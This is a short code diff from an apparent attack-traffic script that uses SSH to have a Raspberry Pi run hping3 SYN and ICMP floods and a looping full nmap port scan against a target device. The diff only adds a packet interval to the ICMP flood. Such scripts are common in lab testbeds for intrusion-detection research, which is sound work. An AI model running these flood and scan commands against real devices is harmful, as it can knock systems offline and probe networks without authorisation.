@@ -16,7 +16,7 @@ async def start_attack(args):
             command = ["ssh", f"{args.pi_user}@{args.pi_ip}", f"sudo hping3 -S -I wlan0 -p 55443 -i u1000 --flood {args.device_ip}"]
             process_name = "hping3"
         elif args.attack == "icmp_flood":
-            command = ["ssh", f"{args.pi_user}@{args.pi_ip}", f"sudo hping3 --icmp --flood {args.device_ip}"]
+            command = ["ssh", f"{args.pi_user}@{args.pi_ip}", f"sudo hping3 --icmp -i u1000 --flood {args.device_ip}"]
             process_name = "hping3"
         elif args.attack == "port_scan":
             command = ["ssh", f"{args.pi_user}@{args.pi_ip}", f"bash -c 'while true; do sudo nmap -sS -p- {args.device_ip}; sleep 1; done'"]
